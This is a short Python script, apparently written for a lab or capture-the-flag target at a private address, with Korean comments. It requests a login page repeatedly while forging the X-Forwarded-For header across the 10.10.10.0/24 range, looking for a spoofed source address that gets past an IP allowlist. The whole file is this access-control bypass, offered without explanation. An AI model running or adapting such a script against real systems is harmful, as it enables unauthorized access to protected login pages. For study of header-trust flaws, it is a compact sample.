import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)
    # 실제 나오는 응답 확인
    if "Your IP is not allowed" not in response.text:
        print(f"[-] {ip}, status: {response.status_code}")
        # 응답 본문 일부 출력
        print(response.text[:300])
    else:
        print(f"[+] {ip}, status: {response.status_code}")
        print(response.text[:300])
